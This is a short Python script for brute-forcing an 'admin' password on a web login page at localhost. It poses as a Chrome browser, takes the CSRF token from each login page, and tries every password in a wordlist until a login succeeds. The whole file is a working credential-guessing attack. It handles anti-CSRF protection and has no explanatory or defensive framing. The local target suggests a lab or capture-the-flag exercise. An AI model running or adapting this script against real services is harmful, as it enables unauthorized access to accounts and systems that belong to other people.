import re
import requests

TARGET = "http://localhost:4567"
HEADERS = {
    "sec-ch-ua": '"Chromium";v="117", "Not;A=Brand";v="8"',
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "sec-ch-ua-mobile": "?0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "empty",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "close"
}
CSRF_TOKEN_PATTERN = r'"csrf_token":"(.*?)"'

def try_login(user: str, password: str) -> bool:
    session = requests.Session()
    session_headers = HEADERS.copy()
    r = session.get(f"{TARGET}/login", headers=session_headers)

    if not (m := re.search(CSRF_TOKEN_PATTERN, r.text)):
        print("Could not find CSRF token")
        return False

    csrf_token = m.group(1)
    session_headers["x-csrf-token"] = csrf_token

    # try to log in
    r = session.post(f"{TARGET}/login", headers=session_headers, data={
        "username": user,
        "password": password,
        "remember": "on",
        "_csrf": csrf_token,
        "noscript": "false"
    })

    return r.status_code == 200

def main():
    count = 1
    with open("wordlist.txt") as f:
        for line in f:
            if try_login("admin", line.strip()):
                print(f"Found password: {line.strip()}")
                break
            count += 1
            if count % 100 == 0:
                print(f"Checked {count} passwords")


if __name__ == '__main__':
    main()
